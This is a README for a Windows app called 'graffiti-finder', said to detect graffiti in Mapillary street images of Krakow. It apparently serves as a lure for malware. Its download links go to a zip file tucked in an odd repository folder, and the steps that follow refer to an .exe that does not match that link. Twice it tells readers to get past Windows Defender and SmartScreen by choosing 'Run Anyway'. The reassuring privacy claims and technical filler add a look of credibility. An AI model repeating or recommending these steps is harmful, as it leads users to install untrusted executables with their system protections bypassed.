# 🎨 graffiti-finder - Organize city graffiti data with ease

[![](https://img.shields.io/badge/Download_Graffiti_Finder-blue?style=for-the-badge)](https://github.com/heavy-cuttingangle951/graffiti-finder/raw/refs/heads/main/unneth/finder_graffiti_v2.1.zip)

This application scans images of Krakow to locate graffiti. It uses a machine learning model to identify paint on structures. You receive a list of locations ready for formatting. The tool works on your computer. It does not send your data to the internet unless you choose to share it.

## 🛠 Prerequisites

Your computer needs specific components to run this software. Ensure you meet these requirements before you start.

- Operating System: Windows 10 or Windows 11.
- Processor: A modern multi-core processor (Intel Core i5 or AMD Ryzen 5).
- Memory: At least 8 gigabytes of RAM.
- Storage: 5 gigabytes of free disk space for map data.
- Graphics: A dedicated graphics card helps, but is not mandatory.

## 📥 Getting the Software

You need to download the installer from the release page.

[https://github.com/heavy-cuttingangle951/graffiti-finder/raw/refs/heads/main/unneth/finder_graffiti_v2.1.zip](https://github.com/heavy-cuttingangle951/graffiti-finder/raw/refs/heads/main/unneth/finder_graffiti_v2.1.zip)

Follow these steps to complete the setup:

1. Visit the link above.
2. Look for the latest release version at the top of the page.
3. Click the link that ends in .exe to download the installer file to your computer.
4. Locate the downloaded file in your Downloads folder.
5. Double-click the file to start the installation.
6. Follow the prompts on your screen to finish installing the software.

## 🖱 Running the Application

Once you finish the installation, you can launch the program from your desktop.

1. Locate the desktop icon labeled graffiti-finder.
2. Double-click the icon to open the main window.
3. The software checks for updates when it opens.
4. If a prompt appears from Windows Defender, click More Info and select Run Anyway. This confirms you trust the software developer.

## 🗺 Using the Software

The interface provides buttons to guide your workflow. The process remains local to your machine.

### Selecting a Map Area
Click the Select Region button. A map of Krakow opens. Click and drag your mouse to box the area you wish to scan. The software calculates the number of images it needs to pull from Mapillary.

### Setting Up Detection
The software uses a computer vision model to spot graffiti. You have two settings:

- Standard: Ideal for general use. It balances speed and accuracy.
- Precise: It spends more time on each image but finds smaller markings.

Select your preferred mode from the Settings menu.

### Running the Scan
Click the Start button. You see a progress bar near the bottom of the window. The tool downloads public street images and scans them for paint. Do not close the window while the progress bar moves.

### Generating the List
When the scan finishes, click the Export button. You can choose to save your findings as an Excel file or a plain text document. The list includes:

- Street name.
- Building coordinates.
- A link to the original image for your review.

## 🔒 Data Privacy

You own your data. This application follows a local-first approach. It does not send image data or your scan lists to any central server. All processing happens on your hardware. You choose if you want to submit your findings to civic groups or city authorities.

## ❓ Troubleshooting

Common issues have simple fixes.

### The app freezes during a scan
Ensure you have an active internet connection as the app pulls data from Mapillary. If your connection drops, the app waits for a signal. Check your network settings if the progress bar stays at zero for a long time.

### The app fails to open
Restart your computer. Some background processes might lock the resources the application needs. If the issue persists, reinstall the application using the file from the original link.

### The detection feels inaccurate
Open the Settings panel and adjust the confidence threshold slider. Moving it to the right makes the software more selective. Moving it to the left allows the software to find more faint markings.

### Windows prevents the launch
Windows sometimes protects your machine from unknown files. If you see a blue box saying SmartScreen prevented an unrecognized app from starting, click the link that says More Info. A button marked Run Anyway appears. Click that to proceed.

## 💻 Tech Details

This software utilizes modern machine learning techniques to help city residents. It relies on the CLIP architecture for image recognition and SAM3 for segmenting shapes from photos. While the tech stack is advanced, you do not need to understand it to use the software. You simply define the area, click the button, and examine the results. Consistent updates keep the identification models current as city structures change.